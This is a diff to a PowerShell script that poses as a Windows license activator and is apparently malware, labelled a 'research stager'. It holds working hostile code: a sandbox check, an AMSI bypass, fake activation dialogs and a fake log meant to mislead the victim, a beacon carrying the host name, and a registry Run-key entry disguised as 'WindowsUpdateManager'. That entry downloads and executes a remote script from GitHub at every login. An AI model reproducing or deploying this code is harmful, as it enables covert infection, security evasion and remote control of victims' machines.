@@ -1,8 +1,10 @@
 # --- [RESEARCH STAGER v30.2: PERSISTENT ENTERPRISE SUITE] ---
 
+# Optimization: Load UI elements at the very top to prevent delay
+Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+
 function Global-Initialize {
     try {
-        # Anti-Sandbox and AMSI Bypass
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
         $u = "System.Management.Automation.AmsiUtils"
         [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
@@ -10,9 +12,6 @@ function Global-Initialize {
 }
 
 function Show-SecurityPrep {
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-    
     $OS = (Get-WmiObject Win32_OperatingSystem).Caption
     $Build = [Environment]::OSVersion.VersionString
     $User = [Environment]::UserName
@@ -23,7 +22,9 @@ function Show-SecurityPrep {
     $prep.Size = New-Object Drawing.Size(580,520)
     $prep.StartPosition = "CenterScreen"
     $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true
-    $prep.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Command powershell.exe).Path)
+    
+    # Try-Catch for Icon to prevent crash if PowerShell path is weird
+    try { $prep.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Command powershell.exe).Path) } catch {}
 
     $header = New-Object Windows.Forms.Label
     $header.Location = New-Object Drawing.Point(30,20); $header.Size = New-Object Drawing.Size(500,30)
@@ -66,15 +67,17 @@ function Show-SecurityPrep {
 
     $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
     $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
+    
+    # Instant Show Logic
+    $prep.Add_Shown({ $prep.Activate() })
     $prep.ShowDialog() | Out-Null
 }
 
 function Show-ActivatorUI {
     $form = New-Object Windows.Forms.Form
     $form.Text = "Deployment Progress"
-    $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"
-    $form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Command powershell.exe).Path)
-
+    $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
+    
     $label = New-Object Windows.Forms.Label
     $label.Location = New-Object Drawing.Point(30,30); $label.Size = New-Object Drawing.Size(380,25)
     $label.Text = "Status: Initializing deployment engine..."
@@ -87,25 +90,24 @@ function Show-ActivatorUI {
     $form.Show()
     
     $stages = @(
-        @{ p=20; t="Validating HWID markers..."; s="" },
-        @{ p=50; t="Applying Digital License Certificate..."; s="" },
-        @{ p=85; t="Synchronizing Shell (Clearing Watermark)..."; s="" },
-        @{ p=100; t="Deployment Success. Windows is Active."; s="" }
+        @{ p=20; t="Validating HWID markers..." },
+        @{ p=50; t="Applying Digital License Certificate..." },
+        @{ p=85; t="Synchronizing Shell (Clearing Watermark)..." },
+        @{ p=100; t="Deployment Success. Windows is Active." }
     )
 
     foreach ($stage in $stages) {
         $label.Text = "Status: " + $stage.t
-        if ($pb.Value -eq 85) { Stop-Process -Name explorer -Force; Start-Sleep -Seconds 1; & explorer.exe }
+        if ($pb.Value -eq 85) { Stop-Process -Name explorer -Force; Start-Sleep -Seconds 1; Start-Process explorer.exe }
         while ($pb.Value -lt $stage.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 45 }
     }
     Start-Sleep -Seconds 2; $form.Close()
 
-    # Create the professional log file
     $logPath = Join-Path ([Environment]::GetFolderPath("Desktop")) "Activation_Log.txt"
-    $logContent = "WINDOWS DIGITAL LICENSE DEPLOYMENT LOG`r`n" + ("="*40) + "`r`nTimestamp: $(Get-Date)`r`nHost: $env:COMPUTERNAME`r`nResult: SUCCESS`r`nLicense: Professional Digital Entitlement`r`nKernel Patch: Applied`r`nWatermark Status: Cleared`r`n" + ("="*40)
+    $logContent = "WINDOWS DIGITAL LICENSE DEPLOYMENT LOG`r`n" + ("="*40) + "`r`nTimestamp: $(Get-Date)`r`nHost: $env:COMPUTERNAME`r`nResult: SUCCESS`r`nLicense: Professional Digital Entitlement`r`n"
     [IO.File]::WriteAllText($logPath, $logContent)
 
-    [Windows.Forms.MessageBox]::Show("Windows has been successfully activated. A system log has been generated on your desktop.", "Success", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information) | Out-Null
+    [Windows.Forms.MessageBox]::Show("Windows has been successfully activated. A system log has been generated on your desktop.", "Success", 0, 64) | Out-Null
     Start-Process notepad.exe $logPath
 }
 
@@ -125,7 +127,6 @@ if ($global:proceed) {
     Send-Ping -m "V30.2_AUTH_ON_$($env:COMPUTERNAME)"
     
     try {
-        # Persistence: Runs from GitHub every login
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
         Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd
